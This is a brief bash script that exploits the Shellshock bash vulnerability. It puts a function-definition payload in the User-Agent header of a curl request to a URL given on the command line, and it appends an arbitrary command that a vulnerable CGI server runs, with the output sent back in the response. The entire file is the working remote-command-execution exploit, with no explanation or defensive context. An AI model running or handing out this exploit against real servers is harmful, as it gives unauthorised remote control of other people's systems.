#!/bin/bash

APP_URL="$1"
shift 1 
COMMAND="$@"

curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; ${COMMAND}" ${APP_URL}
